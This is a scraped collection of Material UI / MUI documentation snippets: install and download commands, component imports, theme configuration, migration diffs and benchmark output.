TITLE: Checking for Material UI v4 Dependencies in JavaScript
DESCRIPTION: This bash command checks for any remaining dependencies on @material-ui/core v4 in your project, which could cause styling issues after migration.

LANGUAGE: bash
CODE:
$ npm ls @material-ui/core
project@0.1.0 /path/to/project
└─┬  @mui/x-data-grid@4.0.0
  └── @material-ui/core@4.12.3

----------------------------------------

TITLE: Creating a Clickable Stepper with StepButton in React
DESCRIPTION: This snippet illustrates how to make Step components clickable by using the StepButton component as a child of Step. It enables interactive stepper interfaces.

LANGUAGE: jsx
CODE:
<Stepper>
  <Step>
    <StepButton>Step 1</StepButton>
  </Step>
  <Step>
    <StepButton>Step 2</StepButton>
  </Step>
  <Step>
    <StepButton>Step 3</StepButton>
  </Step>
</Stepper>

----------------------------------------

TITLE: Theme Configuration for Typography Level Mapping
DESCRIPTION: Example of customizing HTML element mapping for typography levels in the theme configuration.

LANGUAGE: js
CODE:
const theme = extendTheme({
  components: {
    JoyTypography: {
      defaultProps: {
        levelMapping: {
          h1: 'h2',
          h2: 'h2',
          h3: 'h3',
          h4: 'h3',
          'title-lg': 'p',
          'title-md': 'p',
          'title-sm': 'p',
          'body-md': 'p',
          'body-sm': 'p',
          'body-xs': 'span',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Emotion Styled Components Integration
DESCRIPTION: Using Emotion's styled components API with Material UI for custom component styling

LANGUAGE: JSX
CODE:
import * as React from 'react';
import { styled } from '@mui/material/styles';
import Slider from '@mui/material/Slider';

const CustomizedSlider = styled(Slider)`
  color: #20b2aa;

  :hover {
    color: #2e8b57;
  }
`;

export default function StyledComponents() {
  return <CustomizedSlider defaultValue={30} />;
}

----------------------------------------

TITLE: Installing and Running Material UI CRA Example
DESCRIPTION: Commands to install dependencies and start the development server for the Material UI Create React App example.

LANGUAGE: bash
CODE:
npm install\nnpm start

----------------------------------------

TITLE: Exploring MUI Theme in JavaScript Console
DESCRIPTION: Reference to accessing the theme object exposed as a global variable 'theme' in browser console on documentation pages. Note that the documentation uses a custom branded theme.

LANGUAGE: javascript
CODE:
// Access theme object in browser console
console.log(theme);

----------------------------------------

TITLE: FormControl TypeScript Usage with Custom Component
DESCRIPTION: Shows how to use FormControl with TypeScript when specifying custom component types.

LANGUAGE: tsx
CODE:
<FormControl<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

----------------------------------------

TITLE: Rendering Basic Chips in React
DESCRIPTION: Demonstrates the basic usage of the Chip component with both outlined and filled styling options.

LANGUAGE: JSX
CODE:
{"demo": "BasicChips.js"}

----------------------------------------

TITLE: Importing useButton Hook
DESCRIPTION: Basic import statement for the MUI Base useButton hook

LANGUAGE: js
CODE:
import { useButton } from '@mui/base/useButton';

----------------------------------------

TITLE: Updating Material UI Styles Dependency in package.json
DESCRIPTION: Update the @material-ui/styles dependency in package.json to version 4.0.0 or higher if previously using it with v3.

LANGUAGE: json
CODE:
"dependencies": {
  "@material-ui/styles": "^4.0.0"
}

----------------------------------------

TITLE: Using Named Containment Contexts in Material UI
DESCRIPTION: Shows how to create container queries with named containment contexts using the containerQueries method. This allows for more specific targeting of container elements.

LANGUAGE: javascript
CODE:
theme.containerQueries('sidebar').up('500px'); // => '@container sidebar (min-width: 500px)'

----------------------------------------

TITLE: Implementing Fixed Container in React with Material-UI
DESCRIPTION: This code shows how to create a fixed-width Container component. The fixed prop sets the container to have a max-width matching the min-width of the current breakpoint.

LANGUAGE: JSX
CODE:
<Container fixed>

----------------------------------------

TITLE: Example JSS to tss-react API transformation in Material UI v5
DESCRIPTION: Demonstrates the transformation of JSS styles to tss-react API using the codemod. Shows changes in imports, useStyles definition, and component usage.

LANGUAGE: diff
CODE:
 import * as React from 'react';
-import makeStyles from '@material-ui/styles/makeStyles';
+import { makeStyles } from 'tss-react/mui';
 import Button from '@mui/material/Button';
 import Link from '@mui/material/Link';

-const useStyles = makeStyles((theme) => {
+const useStyles = makeStyles()((theme) => {
   return {
     root: {
       color: theme.palette.primary.main,
     },
     apply: {
       marginRight: theme.spacing(2),
     },
   };
 });

 function Apply() {
-  const classes = useStyles();
+  const { classes } = useStyles();

   return (
     <div className={classes.root}>
       <Button component={Link} to="https://support.mui.com" className={classes.apply}>
         Apply now
       </Button>
     </div>
   );
 }

 export default Apply;

----------------------------------------

TITLE: Downloading and Setting Up Material UI CRA TypeScript Example
DESCRIPTION: Commands to download the Material UI Create React App TypeScript example from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-ts
cd material-ui-cra-ts

----------------------------------------

TITLE: Styling GridToolbarContainer in MUI X v4 (Legacy)
DESCRIPTION: Demonstrates the old approach to styling the GridToolbarContainer component in MUI X v4 using higher CSS specificity selectors

LANGUAGE: jsx
CODE:
const GridToolbarContainerStyled = styled(GridToolbarContainer)({
  '&.MuiDataGrid-toolbarContainer': {
    padding: 40,
  },
});

function MyCustomToolbar() {
  return (
    <GridToolbarContainerStyled>My custom toolbar</GridToolbarContainerStyled>
  );
}

export default function App() {
  return (
    <div style={{ height: 400, width: '100%' }}>
      <DataGrid components={{ Toolbar: MyCustomToolbar }} />
    </div>
  );
}

----------------------------------------

TITLE: Installing and Running MUI Base Example with npm
DESCRIPTION: This snippet demonstrates how to install the project dependencies and start the development server using npm commands.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Downloading Material UI Preact Example (Bash)
DESCRIPTION: Commands to download the Material UI Preact example from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-preact
cd material-ui-preact

----------------------------------------

TITLE: Running MUI Docs End-to-End Tests Locally
DESCRIPTION: These commands start the development docs server and run the end-to-end test suites. The tests are located in the test/e2e-website folder and use Playwright for browser automation.

LANGUAGE: markdown
CODE:
1. Run `pnpm docs:dev` to start the development docs server.
2. Run `pnpm test:e2e-website` in a separate terminal to run the test suites (`*.spec.ts`) inside `test/e2e-website` folder.

----------------------------------------

TITLE: Changing Default Font in Joy UI Theme
DESCRIPTION: Example of changing the default font family in the Joy UI theme configuration.

LANGUAGE: js
CODE:
extendTheme({
  fontFamily: {
    display: 'Noto Sans', // applies to `h1`–`h4`
    body: 'Noto Sans', // applies to `title-*` and `body-*`
  },
});

----------------------------------------

TITLE: Customizing Switch Component Slots in React
DESCRIPTION: Demonstrates how to use the 'slots' prop to override the root or other interior slots of the Switch component.

LANGUAGE: jsx
CODE:
<Switch slots={{ root: 'div', track: 'div' }} />

----------------------------------------

TITLE: Controlling Stack Direction
DESCRIPTION: This snippet shows how to use the 'direction' prop to control the layout direction of Stack. By default, Stack arranges items vertically in a column, but it can be changed to horizontal arrangement.

LANGUAGE: jsx
CODE:
{"demo": "DirectionStack.js", "bg": true}

----------------------------------------

TITLE: Updating withTheme HOC Usage
DESCRIPTION: Remove the first option argument of withTheme() as it's no longer needed in v4.

LANGUAGE: diff
CODE:
-const DeepChild = withTheme()(DeepChildRaw);
+const DeepChild = withTheme(DeepChildRaw);

----------------------------------------

TITLE: Importing MUI Palette System
DESCRIPTION: Shows how to import the palette utility from the MUI system package for using color-related functionality.

LANGUAGE: js
CODE:
import { palette } from '@mui/system';

----------------------------------------

TITLE: Implementing Size Variations for Floating Action Buttons in React
DESCRIPTION: Shows how to create Floating Action Buttons (FAB) of different sizes using the 'size' prop. This example likely includes both regular and smaller-sized FABs.

LANGUAGE: jsx
CODE:
"FloatingActionButtonSize.js"

----------------------------------------

TITLE: Customizable Size Rating Component
DESCRIPTION: Shows different size variations of the Rating component using the size prop.

LANGUAGE: JavaScript
CODE:
RatingSize.js

----------------------------------------

TITLE: Importing Basic Checkbox Component - React/JSX
DESCRIPTION: Basic import statement for the Joy UI Checkbox component.

LANGUAGE: jsx
CODE:
import Checkbox from '@mui/joy/Checkbox';

----------------------------------------

TITLE: Downloading MUI Base Vite.js Example with Tailwind CSS
DESCRIPTION: Commands to download the example project from the MUI GitHub repository and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/base-ui-vite-tailwind-ts
cd base-ui-vite-tailwind-ts

----------------------------------------

TITLE: Installing and Running Material UI Express SSR Example
DESCRIPTION: Commands to install dependencies and start the server for the Material UI Express server-side rendering example.

LANGUAGE: bash
CODE:
npm install
npm run start

----------------------------------------

TITLE: Installing Roboto Font via Package Manager
DESCRIPTION: Commands to install the Roboto font using different package managers (npm, pnpm, yarn).

LANGUAGE: bash
CODE:
npm install @fontsource/roboto

LANGUAGE: bash
CODE:
pnpm add @fontsource/roboto

LANGUAGE: bash
CODE:
yarn add @fontsource/roboto

----------------------------------------

TITLE: Using the sx prop with Pigment CSS in React components
DESCRIPTION: Shows how to use the sx prop from Pigment CSS to apply inline styles with theme-aware properties to any DOM element in a React component.

LANGUAGE: jsx
CODE:
<section sx={{ p: 2, border: '1px solid', borderColor: 'divider' }}>
  <h1 sx={{ fontSize: '2rem', fontWeight: 700, mb: 1 }}>
    Introducing Pigment CSS: the next generation of CSS-in-JS
  </h1>
  <p sx={{ color: 'text.primary', fontWeight: 500 }}>
    Pigment CSS offers significant performance gains along with RSC
  </p>
</section>

----------------------------------------

TITLE: Theme Type Declaration for Joy UI Component
DESCRIPTION: Shows how to extend Joy UI's theme types to include custom component styling definitions

LANGUAGE: typescript
CODE:
import { Theme, StyleOverrides } from '@mui/joy/styles';
import { StatProps, StatOwnerState } from '/path/to/Stat';

declare module '@mui/joy/styles' {
  interface Components {
    JoyStat?: {
      defaultProps?: Partial<StatProps>;
      styleOverrides?: StyleOverrides<StatProps, StatOwnerState, Theme>;
    };
  }
}

----------------------------------------

TITLE: Running Pigment CSS Next.js Demo App in Preview Mode
DESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Next.js demo app in preview mode after automatically building it.

LANGUAGE: bash
CODE:
pnpm nx run @app/pigment-css-next-app:preview

----------------------------------------

TITLE: Installing and Running Joy UI Vite.js TypeScript Example
DESCRIPTION: Commands to install project dependencies and start the development server using npm.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Running the Development Server
DESCRIPTION: Commands to install project dependencies and start the development server for the Material UI Pigment CSS example.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Fetching Latest Changes from Material-UI Docs Remote
DESCRIPTION: This bash command fetches the latest changes from the material-ui-docs remote repository's latest branch.

LANGUAGE: bash
CODE:
git fetch material-ui-docs latest

----------------------------------------

TITLE: MUI Line Height Control
DESCRIPTION: Examples of setting line height using the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ lineHeight: 'normal' }}>…
<Box sx={{ lineHeight: 10 }}>…

----------------------------------------

TITLE: Running JSS to tss-react codemod in Material UI v5
DESCRIPTION: Command to run the codemod for migrating JSS styles to tss-react API in Material UI v5.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v5.0.0/jss-to-tss-react <path>

----------------------------------------

TITLE: Customizing Shift Multiplier for Number Input in React
DESCRIPTION: This example shows how to customize the shift multiplier behavior of the Number Input component using the 'shiftMultiplier' prop.

LANGUAGE: jsx
CODE:
<NumberInput min={0} step={1} shiftMultiplier={5} />

----------------------------------------

TITLE: Updating CardActions Props and Classes
DESCRIPTION: Rename the disableActionSpacing prop to disableSpacing and update related CSS classes in CardActions.

LANGUAGE: diff
CODE:
- <CardActions disableActionSpacing>
+ <CardActions disableSpacing>

// CSS classes
- action
+ spacing

----------------------------------------

TITLE: Setting Border Colors with MUI Box Component in JSX
DESCRIPTION: Illustrates how to set border colors using the MUI Box component and the sx prop. Examples include using theme colors and custom color values.

LANGUAGE: jsx
CODE:
<Box sx={{ borderColor: 'primary.main' }}>…
<Box sx={{ borderColor: 'secondary.main' }}>…
<Box sx={{ borderColor: 'error.main' }}>…
<Box sx={{ borderColor: 'grey.500' }}>…
<Box sx={{ borderColor: 'text.primary' }}>…

----------------------------------------

TITLE: Hover Feedback Rating Implementation
DESCRIPTION: Implements rating component with hover feedback using onChangeActive prop.

LANGUAGE: JavaScript
CODE:
HoverRating.js

----------------------------------------

TITLE: Adding units to numeric values in theme overrides
DESCRIPTION: Add appropriate units to numeric values when refactoring array-based syntax in theme overrides.

LANGUAGE: jsx
CODE:
const theme = createTheme({
  components: {
    MuiOutlinedInput: {
      styleOverrides: {
        root: {
          padding: '5px 8px 6px',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Downloading Material UI Remix TypeScript Example
DESCRIPTION: Commands to download the Material UI Remix TypeScript example project from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-remix-ts
cd material-ui-remix-ts

----------------------------------------

TITLE: Basic Modal Component Import and Usage
DESCRIPTION: Basic setup for using the Modal component from Joy UI, showing the import statement and basic component structure.

LANGUAGE: jsx
CODE:
import Modal from '@mui/joy/Modal';

export default function MyApp() {
  return <Modal>{children}</Modal>;
}

----------------------------------------

TITLE: Installing MUI System with pnpm
DESCRIPTION: Command to install MUI System and its Emotion dependencies using pnpm package manager

LANGUAGE: bash
CODE:
pnpm add @mui/system @emotion/react @emotion/styled

----------------------------------------

TITLE: Installing and Running MUI Base Example
DESCRIPTION: Commands to install dependencies and start the development server for the MUI Base TypeScript example.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Switching to Material-UI Docs Latest Branch
DESCRIPTION: This bash command switches to a detached HEAD state at the latest commit of the material-ui-docs remote's latest branch.

LANGUAGE: bash
CODE:
git switch --detach material-ui-docs/latest

----------------------------------------

TITLE: Initializing Grid Display in MUI
DESCRIPTION: Basic setup for creating grid and inline-grid containers using MUI Box component with sx prop

LANGUAGE: jsx
CODE:
<Box sx={{ display: 'grid' }}>…</Box>
<Box sx={{ display: 'inline-grid' }}>…</Box>

----------------------------------------

TITLE: Adding New Color Token in JavaScript
DESCRIPTION: This snippet demonstrates how to add a new color token to an existing color in the palette.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';
import { blue } from '@mui/material/colors';

const theme = createTheme({
  palette: {
    primary: {
      light: blue[300],
      main: blue[500],
      dark: blue[700],
      darker: blue[900],
    },
  },
});

----------------------------------------

TITLE: Invalid Responsive Grid Example - React/JSX
DESCRIPTION: Demonstrates an incorrect implementation of responsive grid columns where the grid item is missing a breakpoint value

LANGUAGE: jsx
CODE:
<Grid container columns={{ xs: 4, md: 12 }}>
  <Grid size={{ xs: 2 }} />
</Grid>

----------------------------------------

TITLE: Importing Aspect Ratio Component in React
DESCRIPTION: This snippet shows how to import the AspectRatio component from the Joy UI library. It's the basic setup required before using the component in your React application.

LANGUAGE: jsx
CODE:
import AspectRatio from '@mui/joy/AspectRatio';

----------------------------------------

TITLE: Defining Classes Interface and Generation for Public Components
DESCRIPTION: Demonstrates how to define and export class interfaces for public MUI components, including utility class generation and documentation comments.

LANGUAGE: typescript
CODE:
export interface FooClasses {
  /** Styles applied to the root element. */
  root: string;
  /** Styles applied to the foo element. */
  foo: string;
  /** Styles applied to the root element if `disabled=true`. */
  disabled: string;
}

const fooClasses: FooClasses = generateUtilityClasses('MuiFoo', ['root', 'foo', 'disabled']);

export default fooClasses;

----------------------------------------

TITLE: Customized Rating Component
DESCRIPTION: Example of customizing the Rating component's appearance and behavior.

LANGUAGE: JavaScript
CODE:
CustomizedRating.js

----------------------------------------

TITLE: Feature List Markdown Component
DESCRIPTION: Example of the custom feature list component showing modal functionality features using markdown list syntax.

LANGUAGE: markdown
CODE:
- Manages modal stacking when one-at-a-time just isn't enough.
- Creates a backdrop, for disabling interaction below the modal.est
- It disables scrolling of the page content while open.
- It properly manages focus; moving to the modal content, and keeping it there until the modal is closed.
- Adds the appropriate ARIA roles automatically.

----------------------------------------

TITLE: Installing MUI System with styled-components using npm
DESCRIPTION: Command to install MUI System with styled-components styling engine using npm

LANGUAGE: bash
CODE:
npm install @mui/system@next @mui/styled-engine-sc@next styled-components

----------------------------------------

TITLE: Installing and Running the Project
DESCRIPTION: Commands to install project dependencies and start the development server.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Displaying Joy UI Template Collection Component
DESCRIPTION: Renders a component that displays a collection of Joy UI application templates, with the toolbar hidden and background set to inline.

LANGUAGE: javascript
CODE:
{"demo": "TemplateCollection.js", "hideToolbar": true, "bg": "inline"}

----------------------------------------

TITLE: Importing Skeleton Component in React
DESCRIPTION: Basic import statement for the Skeleton component from MUI Joy UI library.

LANGUAGE: jsx
CODE:
import Skeleton from '@mui/joy/Skeleton';

----------------------------------------

TITLE: Customizing Tab Root Element in React
DESCRIPTION: This snippet demonstrates how to customize the root element of a Tab component using the slots prop in React.

LANGUAGE: jsx
CODE:
<Tab slots={{ root: 'span' }} />

----------------------------------------

TITLE: Updating Component API Documentation
DESCRIPTION: Commands to update the component API documentation after making changes to TypeScript declarations.

LANGUAGE: bash
CODE:
pnpm proptypes
pnpm docs:api

----------------------------------------

TITLE: Using Unstyled MUI Slider Component
DESCRIPTION: Example of using the unstyled version of the Slider component from the MUI lab, which provides bare functionality without styling for custom implementations.

LANGUAGE: jsx
CODE:
import SliderUnstyled from '@mui/lab/SliderUnstyled';

----------------------------------------

TITLE: Downloading Material UI Example Project with bash
DESCRIPTION: Commands to download the Material UI example project from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-styled-components
cd material-ui-cra-styled-components

----------------------------------------

TITLE: Importing Date-fns Adapter for Date Pickers in React
DESCRIPTION: Shows how to import the adapter for date-fns library in both v2 and v3 versions for use with MUI X Date Pickers components.

LANGUAGE: jsx
CODE:
// date-fns v2.x
import { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFns';

LANGUAGE: jsx
CODE:
// date-fns v3.x
import { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFnsV3';

----------------------------------------

TITLE: Importing Table Pagination Component - React/JSX
DESCRIPTION: Basic import statement for the TablePagination component from MUI Base.

LANGUAGE: jsx
CODE:
import { TablePagination } from '@mui/base/TablePagination';

----------------------------------------

TITLE: Importing Basic Dialog Components in React
DESCRIPTION: Basic import statements for the core Dialog components from Material-UI.

LANGUAGE: jsx
CODE:
import Dialog from '@mui/material/Dialog';
import DialogTitle from '@mui/material/DialogTitle';

----------------------------------------

TITLE: Importing List Components in React
DESCRIPTION: Basic import statements for List and ListItem components from Joy UI.

LANGUAGE: jsx
CODE:
import List from '@mui/joy/List';
import ListItem from '@mui/joy/ListItem';

----------------------------------------

TITLE: Import Path Update Example
DESCRIPTION: Example showing update of import statements to newer package paths

LANGUAGE: diff
CODE:
-import { makeStyles } from '@material-ui/styles';
+import { makeStyles } from '@mui/styles';

----------------------------------------

TITLE: Importing Snackbar Component in React
DESCRIPTION: Shows how to import the Snackbar component from MUI Base UI.

LANGUAGE: jsx
CODE:
import { Snackbar } from '@mui/base/Snackbar';

----------------------------------------

TITLE: Running Codemod for TextField to Input Migration in Joy UI
DESCRIPTION: This bash command runs a codemod to automatically convert TextField components to Input components in a specified path.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v5.0.0/joy-text-field-to-input <path>

----------------------------------------

TITLE: Box Component HTML Structure
DESCRIPTION: The basic HTML structure of the Box component showing its root element with class.

LANGUAGE: html
CODE:
<div className="MuiBox-root">
  <!-- contents of the Box -->
</div>

----------------------------------------

TITLE: Box Component HTML Structure
DESCRIPTION: The basic HTML structure of the Box component showing its root element with class.

LANGUAGE: html
CODE:
<div className="MuiBox-root">
  <!-- contents of the Box -->
</div>

----------------------------------------

TITLE: Using Unreleased Changes in package.json
DESCRIPTION: Example of how to modify package.json to use a preview version of a package from a pull request.

LANGUAGE: diff
CODE:
diff --git a//package.json b//package.json
index 791a7da1f4..a5db13b414 100644
--- a/package.json
+++ b/package.json
@@ -61,7 +61,7 @@
   "dependencies": {
     "@babel/runtime": "^7.4.4",
     "@mui/styled-engine": "^5.0.0-alpha.16",
-    "@mui/material": "^5.0.0-alpha.15",
+    "@mui/material": "https://pkg.csb.dev/mui/material-ui/commit/371c952b/@mui/material",
     "@mui/system": "^5.0.0-alpha.16",

----------------------------------------

TITLE: Testing API: Retrieving Feedback
DESCRIPTION: This curl command shows how to retrieve feedback for a specific ID by sending a GET request to the API endpoint.

LANGUAGE: bash
CODE:
curl <API-URL>/feedback/d6890562-3606-4c14-a765-da81919057d1

----------------------------------------

TITLE: Rendering MUI Component Link Header
DESCRIPTION: Component reference for rendering the MUI docs component link header using JSON syntax.

LANGUAGE: json
CODE:
{"component": "@mui/docs/ComponentLinkHeader"}

----------------------------------------

TITLE: Configuring AppRouterCacheProvider in Next.js App Router
DESCRIPTION: Demonstrates how to wrap the application with AppRouterCacheProvider in the app/layout.tsx file for Next.js App Router.

LANGUAGE: javascript
CODE:
import { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';

export default function RootLayout(props) {
  return (
    <html lang="en">
      <body>
        <AppRouterCacheProvider>
          {props.children}
        </AppRouterCacheProvider>
      </body>
    </html>
  );
}

----------------------------------------

TITLE: Configuring Webpack for Modern Bundle
DESCRIPTION: Update Webpack configuration to use the 'mui-modern' exports condition for smaller bundle size excluding legacy browser support.

LANGUAGE: javascript
CODE:
// webpack.config.js
{
  resolve: {
    conditionNames: ['mui-modern', '...'],
  }
}

----------------------------------------

TITLE: Importing Badge Component in React
DESCRIPTION: Basic import statement for the Badge component from MUI Base.

LANGUAGE: jsx
CODE:
import { Badge } from '@mui/base/Badge';

----------------------------------------

TITLE: Configuring SwipeableDrawer for iOS Devices
DESCRIPTION: Code snippet showing how to configure SwipeableDrawer component with special handling for iOS devices, including disabling backdrop transition and discovery features based on the user agent.

LANGUAGE: jsx
CODE:
const iOS =
  typeof navigator !== 'undefined' && /iPad|iPhone|iPod/.test(navigator.userAgent);

<SwipeableDrawer disableBackdropTransition={!iOS} disableDiscovery={iOS} />;

----------------------------------------

TITLE: Implementing List Item Decorators in React
DESCRIPTION: Import statement for ListItemDecorator component to add supporting icons or elements to list items.

LANGUAGE: jsx
CODE:
import ListItemDecorator from '@mui/joy/ListItemDecorator';

----------------------------------------

TITLE: Sample Benchmark Output for Material-UI Components
DESCRIPTION: Example output of the browser benchmark, showing performance metrics for various Material-UI components and styling solutions. The values represent execution times in milliseconds, with some showing percentage variations.

LANGUAGE: bash
CODE:
noop (baseline):
  02.53 ±00.11ms
Grid (html):
  28.34 ±01.80ms
Grid System:
  167 ±2%
Grid Material UI:
  179 ±1%
Table:
  128 ±3%
React primitives:
  54 ±1%
React components:
  58 ±1%
Styled MUI:
  94 ±1%
Styled emotion:
  96 ±1%
Styled SC:
  94 ±1%
makeStyles:
  83 ±0%
Box Baseline:
  106 ±1%
Box MUI:
  180 ±1%
Box Theme-UI:
  201 ±1%
Box Chakra-UI:
  131 ±1%
styled-components Box + @mui/system:
  184 ±3%
styled-components Box + styled-system:
  154 ±3%

----------------------------------------

TITLE: Adding old font size scale to theme
DESCRIPTION: Code to add the removed font sizes back to the Joy UI theme.

LANGUAGE: javascript
CODE:
extendTheme({
  fontSize: {
    xl7: '4.5rem',
    xl6: '3.75rem',
    xl5: '3rem',
    xs2: '0.625rem',
    xs3: '0.5rem',
  },
});

----------------------------------------

TITLE: Customizing Accordion Heading Element
DESCRIPTION: Example of how to change the default heading element of the Accordion component using the slotProps prop.

LANGUAGE: jsx
CODE:
<Accordion slotProps={{ heading: { component: 'h4' } }}>
  <AccordionSummary
    expandIcon={<ExpandMoreIcon />}
    aria-controls="panel1-content"
    id="panel1-header"
  >
    Accordion
  </AccordionSummary>
  <AccordionDetails>
    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse malesuada
    lacus ex, sit amet blandit leo lobortis eget.
  </AccordionDetails>
</Accordion>

----------------------------------------

TITLE: Running MUI Styles Benchmarks
DESCRIPTION: Synthetic benchmark comparing different styling solutions including JSS, styled-components, emotion, and various button implementations.

LANGUAGE: bash
CODE:
pnpm server:styles

Box x 3,850 ops/sec ±3.58% (178 runs sampled)
JSS naked x 35,493 ops/sec ±2.29% (183 runs sampled)
WithStylesButton x 16,844 ops/sec ±0.34% (191 runs sampled)
HookButton x 23,213 ops/sec ±0.88% (191 runs sampled)
StyledComponentsButton x 7,442 ops/sec ±2.09% (180 runs sampled)
EmotionButton x 11,345 ops/sec ±2.45% (185 runs sampled)
EmotionCssButton x 53,807 ops/sec ±0.40% (191 runs sampled)
EmotionServerCssButton x 43,701 ops/sec ±1.04% (190 runs sampled)
Naked x 58,694 ops/sec ±0.86% (188 runs sampled)

----------------------------------------

TITLE: Running MUI System Benchmarks
DESCRIPTION: Synthetic benchmark comparing styling system performance between styled-system/css, chakra-ui/system, and mui/system implementations.

LANGUAGE: bash
CODE:
pnpm server:system

@styled-system/css x 64,606 ops/sec ±0.45% (188 runs sampled)
@chakra-ui/system/css x 126,272 ops/sec ±0.21% (191 runs sampled)
@mui/system styleFunctionSx x 40,867 ops/sec ±0.50% (191 runs sampled)

----------------------------------------

TITLE: Rendering Demo Container with Hidden Toolbar and Default Background in MUI Docs
DESCRIPTION: Demonstrates hiding the toolbar and setting a default background for a demo container in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocsNotEditable.js", "hideToolbar": true, "bg": true}

----------------------------------------

TITLE: Updating Divider Styles
DESCRIPTION: Example of adjusting styles for the Divider component after the change from <hr> to <div> for vertical orientation.

LANGUAGE: diff
CODE:
-import Divider from '@mui/material/Divider';
+import Divider, { dividerClasses } from '@mui/material/Divider';

 const Main = styled.main({
-  '& hr': {
+  [`& .${dividerClasses.root}`]: {
     marginTop: '16px',
   },
 });

----------------------------------------

TITLE: Migrating Toggle Component
DESCRIPTION: Diff showing the changes required to migrate the Toggle component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import Toggle from 'material-ui/Toggle';
+import Switch from '@material-ui/core/Switch';

-<Toggle
-  toggled={this.state.checkedA}
-  onToggle={this.handleToggle}
-/>
+<Switch
+  checked={this.state.checkedA}
+  onChange={this.handleSwitch}
+/>

----------------------------------------

TITLE: Configuring Transition Component Unmounting in React
DESCRIPTION: Shows how to optimize performance by enabling unmounting of transition components when not visible using the unmountOnExit prop.

LANGUAGE: jsx
CODE:
<Fade in={false} unmountOnExit />

----------------------------------------

TITLE: Running Material UI Core Benchmarks
DESCRIPTION: Synthetic benchmark results for ButtonBase components showing performance metrics with and without ripple effects. Tests different button implementations including HocButton and NakedButton.

LANGUAGE: bash
CODE:
pnpm server:core

ButtonBase x 40,724 ops/sec ±1.58% (189 runs sampled)
HocButton x 166,229 ops/sec ±1.04% (191 runs sampled)
NakedButton x 228,473 ops/sec ±0.99% (187 runs sampled)
ButtonBase enable ripple x 56,019 ops/sec ±0.87% (189 runs sampled)
ButtonBase disable ripple x 61,748 ops/sec ±0.35% (190 runs sampled)

----------------------------------------

TITLE: Displaying Supported Material UI Versions in Markdown
DESCRIPTION: This markdown table shows the different versions of Material UI, their release dates, and current support status for security updates. It uses emoji to visually indicate support levels.

LANGUAGE: markdown
CODE:
| Material UI version | Release    | Supported                            |
| ------------------: | :--------- | :----------------------------------- |
|              ^6.0.0 | 2024-08-26 | :white_check_mark: Stable major      |
|              ^5.0.0 | 2021-09-16 | :white_check_mark: Long-term support |
|              ^4.0.0 | 2019-06-23 | :x:                                  |
|              ^3.0.0 | 2018-08-27 | :x:                                  |
|              ^2.0.0 | /          | :x:                                  |
|              ^1.0.0 | 2018-06-18 | :x:                                  |
|             <=1.0.0 | 2014-10-05 | :x:                                  |

----------------------------------------

TITLE: Rendering Outlined Background Demo Container in MUI Docs
DESCRIPTION: Shows how to explicitly set an outlined background for a demo container in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocs.js", "bg": "outlined"}

----------------------------------------

TITLE: Configuring Legacy Negative Margins
DESCRIPTION: JavaScript configuration example showing how to enable legacy negative margins behavior using theme customization in Material UI v5.

LANGUAGE: js
CODE:
import { createTheme, ThemeProvider } from '@mui/material/styles';
import Grid from '@mui/material/Unstable_Grid2';

const theme = createTheme({
  components: {
    MuiGrid2: {
      defaultProps: {
        disableEqualOverflow: true,
      },
    },
  },
});

function Demo() {
  return (
    <ThemeProvider theme={theme}>
      <Grid container>...grids</Grid>
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Alert Component HTML Structure
DESCRIPTION: Base HTML structure of the Alert component showing the root element with its ARIA role.

LANGUAGE: html
CODE:
<div role="alert" class="MuiAlert-root">
  <!-- Alert contents -->
</div>

----------------------------------------

TITLE: Basic Divider Implementation in React
DESCRIPTION: Basic implementation showing how to import and use the Divider component from Joy UI after installation.

LANGUAGE: jsx
CODE:
import Divider from '@mui/joy/Divider';

export default function MyApp() {
  return <Divider />;
}

----------------------------------------

TITLE: Basic Linear Progress Implementation in React
DESCRIPTION: Demonstrates the basic usage of LinearProgress component after installation. Shows the minimum required code to get started with the component.

LANGUAGE: jsx
CODE:
import LinearProgress from '@mui/joy/LinearProgress';

export default function MyApp() {
  return <LinearProgress />;
}

----------------------------------------

TITLE: Importing Card Layer Components - React/JSX
DESCRIPTION: Import statements for CardCover and CardContent components used for layering content

LANGUAGE: jsx
CODE:
import CardCover from '@mui/joy/CardCover';
import CardContent from '@mui/joy/CardContent';

----------------------------------------

TITLE: Running MUI Environment Info in Bash
DESCRIPTION: This command executes the @mui/envinfo package using npx, which prints detailed system information, including OS, Node.js version, package manager versions, browser versions, and installed npm packages relevant to MUI.

LANGUAGE: bash
CODE:
$ npx @mui/envinfo

